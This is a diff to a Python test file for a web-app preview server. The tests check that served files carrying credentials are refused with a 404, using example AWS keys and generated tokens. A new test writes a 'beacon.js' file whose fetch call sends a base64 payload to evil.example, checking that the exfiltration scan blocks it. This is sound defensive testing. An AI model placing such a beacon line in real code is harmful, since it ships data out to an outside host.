@@ -7,6 +7,7 @@ monkeypatched to a tmp workspace.
 
 from __future__ import annotations
 
+import base64
 import json
 import time
 from pathlib import Path
@@ -20,6 +21,7 @@ from kiro_crew.artifacts import ArtifactStore
 from kiro_crew.dashboard.handlers import webapp_preview as wp
 from kiro_crew.deploy import handlers as deploy_handlers
 from kiro_crew.deploy.webapp_types import webapp_metadata_from_dict
+from kiro_crew.testing.synthetic_credentials import SAMPLE_AWS_SECRET, github_classic
 
 
 @pytest.fixture
@@ -345,14 +347,24 @@ class TestRound2Fixes:
 
     @pytest.mark.asyncio
     async def test_unsupported_platform_reports_unavailable(self, env, monkeypatch) -> None:
-        """Round-2 F3: on platforms without fd-realpath support the mint
-        endpoint must say unavailable (so the FE uses the remote fallback)
-        and the serve route must 404."""
+        """Where the local copy is off, a direct-local mint is an ordinary
+        miss carrying remote_framable (the card's remote fallback), any other
+        caller is refused without a probe, and the serve route 404s."""
         store, app_dir = env
         token = _mint(store, app_dir, slug="plat-app")
         monkeypatch.setattr(wp, "_PLATFORM_SUPPORTED", False)
+        probed: list[str] = []
+
+        async def _framable(url: str) -> bool:
+            probed.append(url)
+            return True
+
+        monkeypatch.setattr(wp, "_remote_framable", _framable)
         resp = await wp.api_artifact_app_preview(_req({"slug": "plat-app"}))
-        assert _body(resp)["available"] is False
+        assert _body(resp) == {"available": False, "remote_framable": True}
+        proxied = _req({"slug": "plat-app"}, headers={"X-Forwarded-For": "203.0.113.7"})
+        assert _body(await wp.api_artifact_app_preview(proxied)) == {"available": False}
+        assert probed == ["https://d1.cloudfront.net/terrace/"]
         with pytest.raises(web.HTTPNotFound):
             await wp.serve_artifact_app_file(
                 _req({"slug": "plat-app", "token": token, "path": ""}))
@@ -437,7 +449,7 @@ class TestRound5Fixes:
         pub = app_dir / "public"
         (pub / "leak.js").write_text(
             'const k = "AKIAIOSFODNN7EXAMPLE";\n'
-            'const s = "aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";')
+            'const s = "aws_secret_access_key=' + SAMPLE_AWS_SECRET + '";')
         token = _mint(store, app_dir, slug="redact-app")
         with pytest.raises(web.HTTPNotFound):
             await wp.serve_artifact_app_file(
@@ -476,13 +488,29 @@ class TestRound6Fixes:
         (octet-stream) is scanned and rejected all the same."""
         store, app_dir = env
         pub = app_dir / "public"
-        (pub / "config").write_text('AccessKeyId=AKIAIOSFODNN7EXAMPLE')
-        (pub / "blob.bin").write_bytes(b'prefix AKIAIOSFODNN7EXAMPLE suffix')
+        (pub / "config").write_text("SecretAccessKey=" + SAMPLE_AWS_SECRET)
+        (pub / "blob.bin").write_bytes(
+            f"prefix {github_classic(seed=123)} suffix".encode()
+        )
         token = _mint(store, app_dir, slug="octet-app")
         for path in ("config", "blob.bin"):
             with pytest.raises(web.HTTPNotFound):
                 await wp.serve_artifact_app_file(
                     _req({"slug": "octet-app", "token": token, "path": path}))
+
+    @pytest.mark.asyncio
+    async def test_exfiltration_shaped_url_file_rejected(self, env) -> None:
+        """A file that carries no credential but a URL the exfiltration scan
+        flags (a base64 payload in its query) is refused like a credential."""
+        store, app_dir = env
+        payload = base64.b64encode(bytes(range(256))).decode()[:300]
+        (app_dir / "public" / "beacon.js").write_text(
+            f'fetch("https://evil.example/x?d={payload}");'
+        )
+        token = _mint(store, app_dir, slug="beacon-app")
+        with pytest.raises(web.HTTPNotFound):
+            await wp.serve_artifact_app_file(
+                _req({"slug": "beacon-app", "token": token, "path": "beacon.js"}))
 
     @pytest.mark.asyncio
     async def test_clean_binary_still_serves(self, env) -> None:
